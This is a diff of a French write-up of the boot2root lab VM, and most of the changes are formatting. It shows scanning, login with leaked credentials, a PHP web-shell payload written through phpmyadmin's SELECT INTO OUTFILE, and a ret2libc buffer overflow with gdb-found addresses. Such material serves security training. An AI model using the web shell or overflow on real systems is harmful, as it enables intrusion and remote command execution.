@@ -7,7 +7,7 @@ Une fois tout cela configuré, on lance la VM.
 ## Trouver l'IP de la VM
 Boot2root nous demande un login et un mot de passe que nous ne connaissons pas. Nous allons donc essayer de trouver l'IP de la VM pour y trouver plus d'informations.
 
-On lance donc la commande `ifconfig`, la VM étant censé y figurer. On remarque un `vboxnet0` avec une adresse IP de `192.168.56.1`. Nous utilisons donc `nmap 192.168.56.0-255` afin de scanner tout les réseaux entre `192.168.56.0` et `192.168.56.255`. `nmap` nous renvoit :
+On lance donc la commande `ifconfig`, la VM étant censé y figurer. On remarque un `vboxnet0` avec une adresse IP de `192.168.56.1`. Nous utilisons donc `nmap 192.168.56.0-255` afin de scanner tout les réseaux entre `192.168.56.0` et `192.168.56.255` :
 ```
 > nmap 192.168.56.0-255
 21/tcp open ftp
@@ -17,11 +17,11 @@ On lance donc la commande `ifconfig`, la VM étant censé y figurer. On remarque
 ```
 On constate que la VM héberge un serveur web avec le port 80.
 
-Afin de référencer les différentes url liées à cette adresse IP nous utilisons DIRB, un scanner de contenu web. DIRB va tester une série de mots clés pour tenter d'y détecter les URL. On install DIRB simplement avec brew.
+Afin de référencer les différentes `url` liées à cette adresse IP nous utilisons `DIRB`, un scanner de contenu web. `DIRB` va tester une série de mots clés pour tenter d'y détecter les `url`. On install `DIRB` avec `brew`.
 ```
 brew install sidaf/pentest/dirb
 ```
-On lance DIRB avec la commande suivante :
+On lance `DIRB` avec la commande suivante :
 ```
 > ./dirb https://192.168.56.101/ wordlists/common.txt
 ---- Scanning URL: https://192.168.56.101/ ----
@@ -37,61 +37,63 @@ Avec un navigateur, on se connecte au forum en utilisant l'adresse `https://192.
 
 On remarque ici plusieurs choses:
 - Il y a un `session_closed(lmezard)` qui nous indique que lmezard s’est connecté.
-- Il y a un `Failed password for invalid user !q]Ej?5K5cyAJ`. Ce login ressemble à un mot de passe, comme si l'utilisateur avait tapé son mot de passe dans le champs du nom d'utilisateur.
+- Il y a un `Failed password for invalid user !q]Ej?5K5cyAJ`. Ce login ressemble à un mot de passe, comme si l'utilisateur avait tapé son mot de passe dans le champ du nom d'utilisateur.
 
-On tente alors de se connecter au forum avec l'utilisteur `lmezard` et la mot de passe `!q\]Ej?*5K5cy*AJ`. Ça fonctionne !
+On tente alors de se connecter au forum avec l'utilisteur `lmezard` et le mot de passe `!q\]Ej?*5K5cy*AJ`. Ça fonctionne !
 
 ## Connexion au webmail
-Son mail sur le forum est `laurie@borntosec.net`. On tente alors de se connecter sur le webmail avec cette adresse mail et le même mot de passe. Là aussi, ça fonctionne ! On remercie Lmezard qui a eu la bonne idée d’avoir un seul mot de passe.
+Le mail de `lmezard` sur le forum est `laurie@borntosec.net`. On tente alors de se connecter sur le webmail avec cette adresse mail et le même mot de passe. Là aussi, ça fonctionne ! On remercie `lmezard` qui a eu la bonne idée de n'avoir qu'un seul mot de passe.
 
-On voit que Lmezard a reçu un email avec les identifiants et mot de passe pour la base de données.
+On voit que `lmezard` a reçu un mail avec les identifiants et mot de passe pour la base de données.
 ```
 root
 Fg-'kKXBj87E:aJ$
 ```
-Ces identifiants nous permettent de nous connecter à phpmyadmin.
+Ces identifiants nous permettent de nous connecter à `phpmyadmin` depuis l'`url` `https://192.168.56.101/phpmyadmin`.
 
 ## phpmyadmin, injection de code et FTP
-Le forum a été créer via MyLittleForum. En cherchant sur internet, on comprend vite qu'il existe de nombreuses failles. Sur le Github d'installation de MyLittleForum, on remarque que le dossier `/var/www/forum/templates_c` nous permet d'avoir les droits d’écritures. L'objectif ici est de créer via phpmyadmin une page php dans ce dossier, et d'y éxecuter du code nous permettant de naviguer sur le serveur.
+Le forum a été créé via `MyLittleForum`. En cherchant sur internet, on comprend vite qu'il existe de nombreuses failles. Sur la page Github d'installation de `MyLittleForum`, on remarque que nous avons les droits d'écriture dans le dossier `/var/www/forum/templates_c`. L'objectif ici est de créer via `phpmyadmin` une page php dans ce dossier, et d'y éxecuter du code nous permettant de naviguer sur le serveur.
 
 On éxecute la commande SQL suivante pour y injecter notre page :
 ```sql
 SELECT "<HTML><BODY><FORM METHOD=\"GET\" NAME=\"myform\" ACTION=\"\"><INPUT TYPE=\"text\" NAME=\"cmd\"><INPUT TYPE=\"submit\" VALUE=\"Send\"></FORM><pre><?php if($_GET['cmd']) {system($_GET[\'cmd\']);} ?> </pre></BODY></HTML>"
-INTO OUTFILE '/var/www/forum/templates_c/hacker5.php'
+INTO OUTFILE '/var/www/forum/templates_c/shell.php'
 ```
-La page contient donc maintenant un input faisant appel à la fonction `system` de php, nous permettant par exemple d'éxcuter un `ls`. En naviguant dans le serveur, on y remarque un dossier `LOOKATME` contenant un ficiher `password`. La commande suivante nous permet d'avoir un nom d'utilisateur et un mot de passe pour nous connecter à la VM.
+La page contient donc maintenant un input faisant appel à la fonction `system` de php, nous permettant par exemple d'éxcuter un `ls`. On peut se rendre sur cette page via l'`url` `https://192.168.56.101/var/www/forum/templates_c/shell.php`. En naviguant dans le serveur, on y remarque un dossier `LOOKATME` contenant un fichier `password`. La commande suivante nous permet d'avoir un nom d'utilisateur et un mot de passe pour nous connecter à la VM.
 ```
 cd /home/LOOKATME ; cat password
 ```
 ```
 lmezard:G!@M6f4Eatau{sF"
 ```
-Ces identifiants nous permettent de nous connecter en FTP avec le port 21.
+Ces identifiants nous permettent de nous connecter en `FTP` avec le port `21`.
 
-Pour se connecter en ftp, on utilise filezilla.
-On a besoin de `l'hote`, d'un `identifiant`, d'un `mot de passe` et d'un `port`
+Pour se connecter en `FTP`, on utilise `filezilla`. On a besoin de l'hote, d'un identifiant, d'un mot de passe et d'un port. Nous utiliserons :
 
 ```
-192.168.56.101 lmezard G!@M6f4Eatau{sF" 21
+    host:   192.168.56.101
+    user:   lmezard 
+password:   G!@M6f4Eatau{sF"
+    port:   21
 ```
 
 ## Connexion ssh
-Grâce à notre connexion ftp, on remarque qu’on a accès à 2 fichiers :
-- Un README contenant `Complete this little challenge and use the result as password for user 'laurie' to login in ssh`.
-- fun, qui est une `tarball`.
+Grâce à notre connexion `FTP`, on remarque qu’on a accès à 2 fichiers :
+- Un `README` contenant `Complete this little challenge and use the result as password for user 'laurie' to login in ssh`.
+- `fun`, qui est une `tarball`.
 
-On commence par `untar` le fichier fun. Un dossier ft_fun apparait.
+On commence par `untar` le fichier `fun`. Un dossier `ft_fun` apparait.
 ```
 > mv fun fun.tar
 > tar -xf fun.tar
 > ls
 README  ft_fun  fun.tar
 ```
-On utilise la fonction `grep getme *` pour trouver les fichiers contenant la déclaration de la fonction `getme`. Chaque fichier contient un commentaire avec le numéro d'un autre fichier. Exemple :
+On utilise la fonction `grep getme *` pour trouver les fichiers contenant la déclaration de la fonction `getme`. Chaque fichier contient un commentaire avec le numéro d'un autre fichier :
 ```c
 //file117
 ```
-En faisant un cat sur ce numéro de fichier + 1 on obtient le return de la fonction `getme` correspondante.
+En faisant un cat sur ce numéro de fichier + 1 on obtient le `return` de la fonction `getme` correspondante.
 ```
 > grep getme *
 0T16C.pcap:char getme4() {
@@ -124,17 +126,17 @@ En répetant cette opération, on obtient :
 ```
 Iheartpwnage
 ```
-Avec un hash sha256, on obtient :
+Avec un hash `sha256`, on obtient :
 ```
 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
 ```
-La commande suivante permet de nous connecter à la VM en ssh :
+La commande suivante permet de nous connecter à la VM en `ssh` :
 ```
 ssh -p 22 laurie@192.168.56.101
 ```
 
 ## BOMB
-Sur la session de Laurie on trouve un fichier README qui nous affiche ceci :
+Sur la session de Laurie on trouve un fichier `README` qui nous contient ceci :
 ```
 Diffuse this bomb!
 When you have all the password use it as "thor" user with ssh.
@@ -208,7 +210,7 @@ undefined4 main(char **argv, char **envp)
 ```
 On remarque qu'il y a 6 phases.
 
-### Phase 1.
+### Phase 1
 La fonction `gcc2_compiled` nous révèle ceci :
 ```c
 void gcc2_compiled.(int32_t arg_8h)
@@ -223,7 +225,7 @@ void gcc2_compiled.(int32_t arg_8h)
     return;
 }
 ```
-On voit ici qu'elle fait une comparaison avec la phrase `Public speaking is very easy.` qui est en fait le mot de passse de cette première étape.
+On voit ici qu'elle fait une comparaison avec la phrase `Public speaking is very easy.` qui est en fait le mot de passe de cette première étape.
 
 ### Phase 2
 La fonction `phase_2` nous révèle ceci :
@@ -254,7 +256,7 @@ void phase_2(int32_t arg_8h)
 ```
 En interprétant le code, et selon le `README` :
 - Le mot de passe contient 6 chiffres.
-- Le deuxième chiffre est 2.
+- Le deuxième chiffre est `2`.
 
 Le mot de passe est la suite factorielle `1 2 6 24 120 720`.
 
@@ -372,7 +374,7 @@ void phase_4(char *s)
     explode_bomb();
 }
 ```
-Le code semble faire allusion à la suite de Fibonacci. `0x37` correspond à 55, le neuvième nombre de la suite de Fibonnaci. Le mot de passe est donc `9`.
+Le code semble faire allusion à la suite de Fibonacci. `0x37` correspond à `55` en base 10, le neuvième nombre de la suite de Fibonnaci. Le mot de passe est donc `9`.
 
 ### Phase 5
 La fonction `phase_5` nous révèle ceci :
@@ -403,7 +405,7 @@ void phase_5(int32_t arg_8h)
     return;
 }
 ```
-`str.isrveawhobpnutfg` correspond à une chaine de caractère `isrveawhobpnutfg`. On remarque que la fonction va chercher une lettre dans cette chaine a partir d'un index calculé, et le compare au mot `giants`. Nous avons créé un petit script Python qui nous permet de calculer, pour chaque lettre de l'alphabet, l'index dans lequel la fonction va chercher la lettre à comparer (voir phase5.py).
+`str.isrveawhobpnutfg` correspond à la chaine de caractère `isrveawhobpnutfg`. On remarque que la fonction va chercher une lettre dans cette chaine à partir d'un index calculé et le compare au mot `giants`. Nous avons créé un petit script `Python` qui nous permet de calculer, pour chaque lettre de l'alphabet, l'index dans lequel la fonction va chercher la lettre à comparer (voir phase5.py).
 
 Le mot de passe est donc `opekma`.
 
@@ -482,9 +484,9 @@ void phase_6(int32_t arg_8h)
 ```
 Le code est plus complexe ici, mais les premières lignes nous permettent de comprendre deux choses :
 - Le mot de passe contient 6 chiffres.
-- Les chiffres sont compris entre 1 et 6.
+- Les chiffres sont compris entre `1` et `6`.
 
-Les combinaisons sont assez faibles. On créer donc un petit script Python pour calculer toutes les combinaisons possibles qui s'arrête lorsque la bombe est désamorcée (voir brutforce.py). On obtient donc le code `426315`.
+Les combinaisons sont assez faibles. On créer donc un petit script `Python` pour calculer toutes les combinaisons possibles qui s'arrête lorsque la bombe est désamorcée (voir brutforce.py). On obtient donc le code `426315`.
 
 La bombe est désamorcée.
 
@@ -500,7 +502,7 @@ Publicspeakingisveryeasy.126241207201b2149opekma426315
 
 On peut donc se connecter en ssh avec l'utilisateur thor :
 ```
-ssh -p 22 thor@192.168.56.101
+> ssh -p 22 thor@192.168.56.101
 ```
 ```
 Publicspeakingisveryeasy.126241207201b2149opekmq426135
@@ -508,15 +510,15 @@ Publicspeakingisveryeasy.126241207201b2149opekmq426135
 
 ## Turtle et zaz
 En arrivant sur le compte de `thor`, on remarque :
-- Un fichier `turtle` qui contitent des instructions similaires au language LOGO.
+- Un fichier `turtle` qui contitent des instructions similaires au language `LOGO`.
 - Un README qui contient : `Finish this challenge and use the result as password for 'zaz' user.`
  
- On retire les mots inutiles aux instructions du fichier `turtle` et on les exécute sur [ce site](http://lwh.free.fr/pages/prog/logo/logo.htm). Le dessin nous montre les lettres `SLASH`.
+On retire les mots inutiles aux instructions du fichier `turtle` et on les exécute sur [ce site](http://lwh.free.fr/pages/prog/logo/logo.htm). Le dessin nous montre les lettres `SLASH`.
  
- À la fin du fichier `turtle`, il était indiqué de hasher ce mot. Le hash `md5` s'avère être la bonne solution. On obtient :
- ```
- 646da671ca01bb5d84dbb5fb2238dc8e
- ```
+À la fin du fichier `turtle`, il était indiqué de hasher ce mot. Le hash `md5` s'avère être la bonne solution. On obtient :
+```
+646da671ca01bb5d84dbb5fb2238dc8e
+```
 On peut ainsi se connecter avec l'utilisateur zaz en ssh :
 ```
 ssh -p 22 zaz@192.168.56.101
@@ -536,12 +538,12 @@ bool main(char **argv, char **envp)
     return (int32_t)argv < 2;
 }
 ```
-Le programme est très simple : il affiche sur l'entrée standard le premier argument reçu en ligne de commande. Néanmoins, on remarque que le programme alloue un buffer de 140 octets et copie l'argument dedans. Si notre argument excède 140 caractères, le progamme `SEGFAULT`.
+Le programme est simple : il affiche sur l'entrée standard le premier argument reçu en ligne de commande. Néanmoins, on remarque que le programme alloue un `buffer` de `140` octets et copie l'argument dedans. Si notre argument excède 140 caractères, le progamme `SEGFAULT`.
 
 Nous allons donc exploiter ce `SEGFAULT` avec la faille `Ret2libc`.
 
 ### Adressage
-Pour éxcuter notre shell, nous avons besoin de trouver l'adresse de la fonction `system` et de la chaine `"/bin/sh"`. Le but étant de faire un call à `system` avec ce paramètre. Pour cela, on exécute `gdb` sur notre exécutable avec les commandes suivante :
+Pour éxcuter notre shell, nous avons besoin de trouver l'adresse de la fonction `system` et de la chaine `"/bin/sh"`. Le but étant de faire un appel à la fonction `system` avec ce paramètre. Pour cela, on exécute `gdb` sur notre exécutable avec les commandes suivante :
 ```
 > gdb exploit_me
 [...]
@@ -551,7 +553,9 @@ Pour éxcuter notre shell, nous avons besoin de trouver l'adresse de la fonction
 [...]
 ```
 
-#### system
+---
+
+**system**
 
 ```
 > (gdb) p system
@@ -559,7 +563,7 @@ $1 = {<text variable, no debug info>} 0xb7e6b060 <system>
 ```
 L'adresse de `system` est `0xb7e6b060`.
 
-#### /bin/sh
+**/bin/sh**
 
 ```
 > (gdb) find __libc_start_main,+99999999,"/bin/sh"
@@ -569,7 +573,7 @@ warning: Unable to access target memory at 0xb7fd3160, halting search.
 1 pattern found.
 ```
 
-Si on regarde dans cette addresse, on voit bien que c'est /bin/sh
+En regardant le contenu à l'adresse `0xb7f8cc58`, on voit confirme que c'est `/bin/sh` :
 
 ```
 > (gdb) x/s 0xb7f8cc58
@@ -578,38 +582,40 @@ Si on regarde dans cette addresse, on voit bien que c'est /bin/sh
 ```
 L'adresse de `"/bin/sh"` est `0xb7f8cc58`.
 
+---
+
 ## Stack
-Lors d'un appel à une fonction, la stack ressemble à ceci :
+Lors d'un appel à une fonction, la `stack` ressemble à ceci :
 ```
-[...]
-[function parameter 2]
-[function parameter 1]
+---------------------- esp
+[local variable]
+[local variable]
+---------------------- ebp
 [function ret]
----------------------- EBP
-[local variable]
-[local variable]
----------------------- ESP
-```
-Notre but est de faire ressembler la stack à ceci, pour exécuter la fonction `system` avec notre `"/bin/sh"`.
-```
+[function parameter 1]
+[function parameter 2]
 [...]
-[/bin/sh]       // system function argument
-[system ret]    // system return address
+```
+Notre but est de faire ressembler la `stack` à ceci, pour exécuter la fonction `system` avec notre `"/bin/sh"`.
+```
+---------------------- esp
+[buffer[140]]
+---------------------- ebp
 [system]        // system call
----------------------- EBP
-[buffer[140]]
----------------------- ESP
-```
-Avant de remplir notre buffer, notre stack est semblable à celle ci dessous :
-```
+[system ret]    // system return address
+[/bin/sh]       // system function argument
 [...]
-[reg]
-[reg]
----------------------- EBP
-[buffer[140]]
----------------------- ESP
 ```
-En remplissant plus de 140 octets dans notre buffer, nous somme capable d'écrire dans les registres suivants. Nous pouvons donc créer un buffer qui, avec un overflow, écrira nos instructions `system` dans les registres suivants. Nous devons suivre ce schéma :
+Avant de remplir notre `buffer`, notre `stack` est semblable à celle ci dessous :
+```
+---------------------- esp
+[buffer[140]]
+---------------------- ebp
+[reg]
+[reg]
+[...]
+```
+En remplissant plus de `140` octets dans notre `buffer`, nous somme capable d'écrire dans les registres suivants. Nous pouvons donc créer un buffer qui, avec un overflow, écrira nos instructions `system` dans les registres suivants. Nous devons suivre ce schéma :
 ```
 [ Buffer permettant d'atteindre l'overflow ] [ Adresse system() ] [ Adresse retour ] [ Adresse "/bin/sh" ]
 ```
